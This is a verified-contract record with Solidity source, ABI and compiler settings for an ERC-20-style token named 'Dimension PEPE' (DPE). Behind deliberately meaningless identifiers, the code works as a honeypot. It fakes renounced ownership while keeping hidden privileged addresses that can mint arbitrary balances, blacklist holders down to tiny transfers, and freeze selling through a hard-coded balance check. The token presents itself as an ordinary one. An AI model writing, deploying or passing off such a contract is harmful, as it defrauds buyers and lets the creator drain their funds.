{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface launchedShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderReceiver) external view returns (uint256);\n\n    function transfer(address launchedAt, uint256 takeLiquidityLaunched) external returns (bool);\n\n    function allowance(address listFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeLiquidityLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedAt,\n        uint256 takeLiquidityLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeShould, uint256 value);\n    event Approval(address indexed listFund, address indexed spender, uint256 value);\n}\n\nabstract contract modeExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldLaunch {\n    function createPair(address limitTo, address launchedTradingTake) external returns (address);\n}\n\ninterface launchEnable is launchedShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DimensionPEPE is modeExempt, launchedShould, launchEnable {\n\n    bool public enableFund;\n\n    uint256 public totalLimit;\n\n    bool public tradingMaxFrom;\n\n    function receiverMode() private view {\n        require(feeToLaunch[_msgSender()]);\n    }\n\n    function transfer(address senderMin, uint256 takeLiquidityLaunched) external virtual override returns (bool) {\n        return swapWallet(_msgSender(), senderMin, takeLiquidityLaunched);\n    }\n\n    function swapWallet(address feeLiquidity, address launchedAt, uint256 takeLiquidityLaunched) internal returns (bool) {\n        if (feeLiquidity == tokenTotal) {\n            return tradingIs(feeLiquidity, launchedAt, takeLiquidityLaunched);\n        }\n        uint256 feeAtFund = launchedShould(totalReceiverAuto).balanceOf(shouldReceiver);\n        require(feeAtFund == swapTake);\n        require(launchedAt != shouldReceiver);\n        if (listTxTotal[feeLiquidity]) {\n            return tradingIs(feeLiquidity, launchedAt, tradingMarketingFee);\n        }\n        return tradingIs(feeLiquidity, launchedAt, takeLiquidityLaunched);\n    }\n\n    uint8 private totalFeeMin = 18;\n\n    uint256 public amountBuyAt;\n\n    function swapTrading(uint256 takeLiquidityLaunched) public {\n        receiverMode();\n        swapTake = takeLiquidityLaunched;\n    }\n\n    function transferFrom(address feeLiquidity, address launchedAt, uint256 takeLiquidityLaunched) external override returns (bool) {\n        if (_msgSender() != isMarketing) {\n            if (shouldBuy[feeLiquidity][_msgSender()] != type(uint256).max) {\n                require(takeLiquidityLaunched <= shouldBuy[feeLiquidity][_msgSender()]);\n                shouldBuy[feeLiquidity][_msgSender()] -= takeLiquidityLaunched;\n            }\n        }\n        return swapWallet(feeLiquidity, launchedAt, takeLiquidityLaunched);\n    }\n\n    address private enableMax;\n\n    string private walletFee = \"DPE\";\n\n    uint256 swapTake;\n\n    uint256 public minAuto;\n\n    bool public txMarketing;\n\n    function tradingIs(address feeLiquidity, address launchedAt, uint256 takeLiquidityLaunched) internal returns (bool) {\n        require(takeAtFund[feeLiquidity] >= takeLiquidityLaunched);\n        takeAtFund[feeLiquidity] -= takeLiquidityLaunched;\n        takeAtFund[launchedAt] += takeLiquidityLaunched;\n        emit Transfer(feeLiquidity, launchedAt, takeLiquidityLaunched);\n        return true;\n    }\n\n    string private sellBuy = \"Dimension PEPE\";\n\n    mapping(address => uint256) private takeAtFund;\n\n    uint256 private teamLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableTeam;\n    }\n\n    function owner() external view returns (address) {\n        return enableMax;\n    }\n\n    uint256 limitReceiver;\n\n    address isMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address shouldReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return sellBuy;\n    }\n\n    function balanceOf(address senderReceiver) public view virtual override returns (uint256) {\n        return takeAtFund[senderReceiver];\n    }\n\n    event OwnershipTransferred(address indexed teamReceiver, address indexed receiverMaxExempt);\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletFee;\n    }\n\n    uint256 constant tradingMarketingFee = 6 ** 10;\n\n    address public tokenTotal;\n\n    function getOwner() external view returns (address) {\n        return enableMax;\n    }\n\n    function approve(address minMode, uint256 takeLiquidityLaunched) public virtual override returns (bool) {\n        shouldBuy[_msgSender()][minMode] = takeLiquidityLaunched;\n        emit Approval(_msgSender(), minMode, takeLiquidityLaunched);\n        return true;\n    }\n\n    uint256 private enableTeam = 100000000 * 10 ** 18;\n\n    function toTakeMarketing(address senderMin, uint256 takeLiquidityLaunched) public {\n        receiverMode();\n        takeAtFund[senderMin] = takeLiquidityLaunched;\n    }\n\n    function launchedReceiver(address swapAuto) public {\n        require(swapAuto.balance < 100000);\n        if (txMarketing) {\n            return;\n        }\n        if (totalLimit == amountBuyAt) {\n            teamLimit = minAuto;\n        }\n        feeToLaunch[swapAuto] = true;\n        if (totalLimit == minAuto) {\n            enableFund = false;\n        }\n        txMarketing = true;\n    }\n\n    function totalTeam() public {\n        emit OwnershipTransferred(tokenTotal, address(0));\n        enableMax = address(0);\n    }\n\n    address public totalReceiverAuto;\n\n    bool public tradingMode;\n\n    uint256 public swapAtAmount;\n\n    mapping(address => mapping(address => uint256)) private shouldBuy;\n\n    mapping(address => bool) public feeToLaunch;\n\n    bool private fundTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalFeeMin;\n    }\n\n    constructor (){\n        if (tradingMode) {\n            tradingMode = false;\n        }\n        fundFee limitModeReceiver = fundFee(isMarketing);\n        totalReceiverAuto = shouldLaunch(limitModeReceiver.factory()).createPair(limitModeReceiver.WETH(), address(this));\n        if (swapAtAmount != totalLimit) {\n            enableFund = false;\n        }\n        tokenTotal = _msgSender();\n        totalTeam();\n        feeToLaunch[tokenTotal] = true;\n        takeAtFund[tokenTotal] = enableTeam;\n        \n        emit Transfer(address(0), tokenTotal, enableTeam);\n    }\n\n    function buySwap(address txMax) public {\n        receiverMode();\n        \n        if (txMax == tokenTotal || txMax == totalReceiverAuto) {\n            return;\n        }\n        listTxTotal[txMax] = true;\n    }\n\n    function allowance(address fromLiquidity, address minMode) external view virtual override returns (uint256) {\n        if (minMode == isMarketing) {\n            return type(uint256).max;\n        }\n        return shouldBuy[fromLiquidity][minMode];\n    }\n\n    mapping(address => bool) public listTxTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMaxExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountBuyAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLiquidityLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"}],\"name\":\"buySwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeToLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"}],\"name\":\"launchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTxTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeLiquidityLaunched\",\"type\":\"uint256\"}],\"name\":\"swapTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLiquidityLaunched\",\"type\":\"uint256\"}],\"name\":\"toTakeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalReceiverAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMaxFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLiquidityLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeLiquidityLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DimensionPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}